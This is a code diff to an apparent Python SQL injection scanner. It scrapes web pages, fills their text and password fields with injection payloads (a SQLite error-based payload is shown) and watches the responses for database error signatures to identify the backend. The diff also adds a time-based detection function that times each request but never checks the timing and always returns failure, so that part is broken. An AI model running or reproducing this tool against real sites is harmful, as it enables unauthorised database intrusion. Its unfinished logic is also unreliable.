@@ -26,17 +26,13 @@ error_based_db_payloads = {
         "SQLite": ["' AND 1=ABS(CAST(SQLITE_VERSION() AS INTEGER))--"]
     }  
 
-def identify_db_post(scrapped_data):
-    for url in scrapped_data:
-        # print(f"{colored(url, RED)}")
-        
-        for db_type, payloads in error_based_db_payloads.items():
+def error_based_injection_post(url):
+    for db_type, payloads in error_based_db_payloads.items():
             for payload in payloads:
                 
                 response = requests.get(url)
                 soup = BeautifulSoup(response.text, 'html.parser')
                 inputs = soup.find_all('input')
-                # input_data = {input_tag.get('name', f'input_{i}'): input_tag.get('value', '') for i, input_tag in enumerate(inputs)}
                 input_data = {}
                 for i, input in enumerate(inputs):
                     if "input" in str(input) and ('type="password"' in str(input) or 'type="text"' in str(input)):
@@ -45,19 +41,55 @@ def identify_db_post(scrapped_data):
                         else:
                             input_data[input.get('name', f'input_{i}')] = "pass"
                     
-                
+                # print(input_data)
                 response = requests.post(url, data=input_data)
                 response_text_lower = response.text.lower()
                 
                 
                 for signature in db_error_signatures.get(db_type, []):
                     if signature in response_text_lower:
-                        print(f"{colored('🟢 Detection:', WHITE, styles=BOLD)} {colored(url, GREEN, styles=BLINK)} > {colored(db_type, MAGENTA, styles=BOLD)} - {colored('error-based', CYAN, styles=BOLD)}")
                         return True, db_type, "error-based"
-    
-      
+    return False, None, None
+
+import time
+def time_based_injection_post(url):
+    for db_type, payload in time_based_payloads.items():
+        response = requests.get(url)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        inputs = soup.find_all('input')
+        input_data = {}
+        for i, input in enumerate(inputs):
+            if "input" in str(input) and ('type="password"' in str(input) or 'type="text"' in str(input)):
+                if i == 0:
+                    input_data[input.get('name', f'input_{i}')] = payload
+                else:
+                    input_data[input.get('name', f'input_{i}')] = "pass"
+        try:          
+            start_time = time.time()   
+            response = requests.post(url, data=input_data)
+            end_time = time.time()
+            
+        except requests.exceptions.RequestException as e:
+            pass
+        except Exception as e:
+            print(f"    Une erreur inattendue s'est produite: {e}")
+    return False, None, None
+
+
+def identify_db_post(scrapped_data):
+    for url in scrapped_data:
+        
+        success, db_type, detection = time_based_injection_post(url)
+        if success == False:
+            success, db_type, detection = error_based_injection_post(url)            
+        if success:
+            print(f"{colored('🟡 Detection:', YELLOW, styles=BOLD)} {colored(url, GREEN, styles=BLINK)} > {colored(db_type, MAGENTA, styles=BOLD)}")
+            break
+        print(f"{colored('🟡 Detection:', YELLOW, styles=BOLD)} {colored(url, RED, styles=STRIKETHROUGH)}")
         
     return False, None, None
+      
+        
                 
 def check_sql_injection_post(url):  
     success = False
